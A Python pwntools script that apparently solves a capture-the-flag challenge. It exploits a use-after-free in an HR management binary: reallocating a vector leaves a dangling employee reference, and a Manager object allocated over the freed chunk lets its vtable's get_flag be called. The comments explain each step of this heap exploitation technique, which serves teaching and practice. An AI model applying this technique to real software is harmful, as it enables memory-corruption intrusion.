#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("../src/hr_invalidation")

context.binary = exe.path
context.terminal = ["tmux", "new-window"]


if len(sys.argv) == 3:
    try:
        address = sys.argv[1]
        port = int(sys.argv[2])
        args.REMOTE = True
    except:
        pass


def conn():
    if args.REMOTE:
        r = remote(address, port)
    else:
        r = process([exe.path])

    return r


def attach_gdb():
    if args.GDB:
        gdb.attach(
            r,
            gdbscript="""
source ~/opt/pwndbg/gdbinit.py
        """,
        )


def search_employee_by_id(_id):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", str(_id).encode())


g_id = 0


def add_employee(firstname, lastname, salary):
    global g_id
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"First name: ", firstname)
    r.sendlineafter(b"Last name: ", lastname)
    r.sendlineafter(b"Salary: ", str(salary).encode())
    ret = g_id
    g_id += 1
    return ret


def logout():
    r.sendlineafter(b"\n> ", b"5")


def main():
    global r
    r = conn()
    attach_gdb()

    # fill in manager information
    r.sendlineafter(b"First name: ", b"abc")
    r.sendlineafter(b"Last name: ", b"def")

    # add employees such that the vector g_employees is allocated in a heap chunk of 0xc0 (the chunk size for a Manager)
    target_id = add_employee(b"a", b"a", 123)
    add_employee(b"b", b"b", 123)

    # search for the first employee to put it in g_last_employee
    search_employee_by_id(target_id)

    # adding an element to a vector can cause it to be reallocated and copied to an other location on the heap
    # this leads to an iterator/reference invalidation as the old references now point to a freed region on the heap
    #
    # see https://en.cppreference.com/w/cpp/container/vector#Iterator_invalidation
    # and https://en.cppreference.com/w/cpp/container#Iterator_invalidation
    add_employee(b"c", b"c", 123)

    # we now have a use-after-free if we use g_last_employee

    # a new manager will be allocated over our invalid reference to g_last_employee
    logout()
    r.sendlineafter(b"First name: ", b"pwned")
    r.sendlineafter(b"Last name: ", b"pwned")

    # g_last_employee now points to a Manager instance

    # we can use the Manager as an Employee through g_last_employee
    # this allows us to call get_flag from the vtable of the Manager
    search_employee_by_id(-1)

    r.interactive()


if __name__ == "__main__":
    main()
